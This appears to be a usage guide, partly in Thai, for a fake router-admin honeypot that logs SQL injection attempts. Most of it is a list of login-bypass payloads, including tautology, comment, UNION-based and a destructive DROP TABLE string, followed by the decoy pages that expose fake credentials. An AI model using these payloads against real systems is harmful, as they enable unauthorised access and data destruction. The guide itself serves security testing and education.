================================================================================
                    WEB HONEYPOT - SQL INJECTION TESTING GUIDE
================================================================================

วิธีการใช้งาน Web Honeypot
--------------------------

1. รันโปรเจค:
   python main.py

2. เปิด browser ไปที่:
   http://localhost:8080/login

3. หน้า login จะแสดงเป็น Router Admin Panel ปลอม

================================================================================
                         ตัวอย่าง SQL INJECTION PAYLOADS
================================================================================

[Basic Authentication Bypass]
-----------------------------
Username: admin' OR '1'='1
Password: anything

Username: admin'--
Password: anything

Username: ' OR 1=1--
Password: anything

Username: admin' OR '1'='1'--
Password: anything

Username: ' OR ''='
Password: ' OR ''='


[Using Comments]
----------------
Username: admin'/*
Password: */OR '1'='1

Username: admin'#
Password: anything

Username: admin'-- -
Password: anything


[UNION Based]
-------------
Username: ' UNION SELECT 1,2,3--
Password: anything

Username: ' UNION ALL SELECT 'admin','password'--
Password: anything

Username: admin' UNION SELECT NULL,NULL,NULL--
Password: anything


[Tautology Based]
-----------------
Username: ' OR 1=1#
Password: anything

Username: ' OR 'x'='x
Password: anything

Username: ' OR 1=1 LIMIT 1--
Password: anything

Username: admin' OR 1=1 ORDER BY 1--
Password: anything


[String Concatenation]
----------------------
Username: admin'||'
Password: anything

Username: ' OR 'a'='a
Password: anything


[Advanced Payloads]
-------------------
Username: '; DROP TABLE users--
Password: anything

Username: ' OR EXISTS(SELECT * FROM users)--
Password: anything

Username: ' HAVING 1=1--
Password: anything

Username: ' GROUP BY columnname HAVING 1=1--
Password: anything


================================================================================
                              หลังจาก LOGIN สำเร็จ
================================================================================

เมื่อ SQL Injection สำเร็จ จะเข้าถึงหน้าต่างๆ ได้:

1. /dashboard  - แสดงสถานะระบบและอุปกรณ์ที่เชื่อมต่อ
2. /users      - แสดงรายชื่อผู้ใช้พร้อม password hash
3. /network    - แสดงอุปกรณ์ในเครือข่ายพร้อม IP/MAC
4. /settings   - แสดง credentials ต่างๆ (MySQL, FTP, SSH, API keys)
5. /logs       - แสดง system logs และ security events
6. /backup     - แสดง backup files และ cloud credentials

================================================================================
                              หมายเหตุ
================================================================================

- ทุก credentials ที่แสดงเป็นข้อมูลปลอมเพื่อล่อ hacker
- ระบบจะ log ทุก SQL injection attempt พร้อม IP address
- ข้อมูลที่ hacker พยายามขโมยจะถูกบันทึกไว้ใน honeypot logs
- ใช้สำหรับการศึกษาและทดสอบระบบความปลอดภัยเท่านั้น
